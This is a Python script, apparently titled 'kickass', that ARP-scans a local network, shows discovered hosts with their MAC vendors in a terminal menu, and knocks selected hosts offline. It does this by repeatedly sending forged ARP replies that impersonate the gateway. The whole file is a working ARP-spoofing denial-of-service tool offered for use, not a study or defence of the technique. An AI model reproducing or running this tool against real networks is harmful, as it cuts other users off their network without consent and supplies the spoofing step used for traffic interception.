#!usr/bin/env python3

from scapy.all import ARP, Ether, conf, srp, sendp
import urllib.request as request
import urllib.error as urlerror
import ipaddress
import threading
import curses
import time
import json
import sys

class Host:
    def __init__(self, ip, mac, config, network, gateway):
        self.ip = ip
        self.mac = mac
        self.config = config
        self.network = network
        self.gateway = gateway
        self.__active = False

        # make api request to get vendor
        # return 404 if not found
        try: self.vendor = request.urlopen(
            'http://api.macvendors.com/' + mac).read().decode()

        except urlerror.HTTPError: self.vendor = 'N/A'

    def start(self):
        self.__active = True
        threading.Thread(target=self.kick_loop).start()

    def stop(self):
        self.__active = False

    def is_active(self):
        return self.__active

    def kick_arp(self):
        sendp(Ether(dst=self.mac)/ARP(
            op='is-at',
            psrc=self.gateway))

    def kick_loop(self):
        while self.__active:
            if self.config['kick_method'] == 'arp':
                self.kick_arp()
            time.sleep(self.config['kick_interval'])

class Kickass:
    def __init__(self):
        # load config
        try: self.config = json.load(open('config.json'))
        except FileNotFoundError:
            print('config file was not found')
            self.print_help()
            sys.exit(120)

        # network range is the first argument
        # ipaddress lib to check if its valid
        try: self.network = str(ipaddress.ip_network(sys.argv[1]))
        except (ValueError, IndexError):
            print('network ip range was not valid')
            self.print_help()
            sys.exit(120)

        # gateway is the first argument
        try: self.gateway = str(ipaddress.ip_address(sys.argv[2]))
        except (ValueError, IndexError):
            print('gateway ip was not valid')
            self.print_help()
            sys.exit(120)

        # init curses
        self.stdscr = curses.initscr()
        self.stdscr.keypad(True)
        curses.noecho()
        curses.cbreak()
        curses.curs_set(0)

        self.hosts = []

        try:
            self.scan_hosts()
            self.draw_menu(0)
            self.ui_loop()
        except KeyboardInterrupt: pass
        finally: self.exit()

    def exit(self):
        # exit curses
        curses.nocbreak()
        self.stdscr.keypad(False)
        curses.curs_set(1)
        curses.echo()
        curses.endwin()

    def print_help(self):
        print('usage: kickass.py <network_range> <gateway ip>')
        print('example: kickass.py 192.168.189.0/24 192.168.189.1')

    def arp_scan(self):
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
            pdst=self.network),
            timeout=self.config['scan_timeout'],
            retry=self.config['scan_retries'])

        for pck in ans:
            arp = pck[1]['ARP']
            self.hosts.append(
                Host(arp.psrc,
                    arp.hwsrc,
                    self.config,
                    self.network,
                    self.gateway))

    def scan_hosts(self):
        # todo: dont delete all so selection is remembered!
        self.stdscr.clear()
        self.stdscr.addstr('Scanning hosts with method: {}...'.format(
            self.config['scan_method']
        ))

        self.stdscr.refresh()

        self.hosts.clear()
        method = self.config['scan_method']
        if method == 'arp': self.arp_scan()

    def ui_loop(self):
        active = True
        selected_index = 0
        while active:
            key = self.stdscr.getkey()

            # handle key presses
            max_index = len(self.hosts) -1
            if key == 'KEY_UP':
                if selected_index > 0:
                    selected_index -= 1

            elif key == 'KEY_DOWN':
                if selected_index >= max_index:
                    selected_index = max_index
                else: selected_index += 1

            elif key == '\n':
                host = self.hosts[selected_index]
                if host.is_active(): host.stop()
                else: host.start()

            if len(key) == 1:
                # 18 is ^R
                if ord(key) == 18:
                    self.scan_hosts()

                # 5 is ^E
                elif ord(key) == 5:
                    active = False

            self.draw_menu(selected_index)

    def draw_menu(self, select_index):
        self.stdscr.clear()
        self.stdscr.addstr('CRLT+R to rescan  UP/DOWN to navigate  ENTER to enable/disable\n\n')
        self.stdscr.addstr(' A   IP               MAC                VENDOR\n', curses.A_BOLD)
        self.stdscr.addstr('---  ---------------  -----------------  -----------------\n')
        # AzureWave Technology Inc.
        def print_table_coll(string, padding):
            self.stdscr.addstr(string + (' ' * (padding - len(string))))

        for i, host in enumerate(self.hosts):
            print_table_coll('{}{}]'.format(
                '[' if (i != select_index) else '>',
                '*' if host.is_active() else ' '
            ), 5)
            print_table_coll(host.ip, 17)
            print_table_coll(host.mac, 19)
            print_table_coll(host.vendor, 20)

            self.stdscr.addstr('\n')

        self.stdscr.refresh()

if __name__ == '__main__':
    # shut up scapy
    conf.verb = 0
    kick = Kickass()
